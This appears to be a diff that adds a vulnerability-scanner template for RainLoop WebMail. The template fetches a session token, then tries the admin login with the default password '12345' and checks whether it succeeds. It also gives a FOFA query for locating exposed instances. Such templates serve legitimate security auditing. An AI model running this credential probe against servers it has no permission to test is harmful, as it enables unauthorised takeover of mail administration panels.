@@ -1,0 +1,35 @@
+id: rainloop-default-login
+
+info:
+  name: Rainloop WebMail - Default Admin Login
+  author: For3stCo1d
+  severity: high
+  verified: true
+  description: |
+    Rainloop WebMail default admin login credentials were successful.
+    FOFA: app="RAINLOOP-WebMail"
+  reference:
+    - https://github.com/RainLoop/rainloop-webmail/issues/28
+  tags: default-login,rainloop,webmail,foss
+  created: 2023/06/17
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /?/AdminAppData@no-mobile-0/0/15503332983847185/
+    expression: response.raw.bcontains(b'token":"')
+    output:
+      search: '"\"token\":\"(?P<token>.*?)\"".bsubmatch(response.body)'
+      token: search["token"]
+  r1:
+    request:
+      method: POST
+      path: /?/Ajax/&q[]=/0/
+      body: |
+        Login=admin&Password=12345&Action=AdminLogin&XToken={{token}}
+    expression: |
+      response.status == 200 &&
+      response.body.bcontains(b'"Action":"AdminLogin"') &&
+      response.body.bcontains(b'"Result":true')
+expression: r0() && r1()
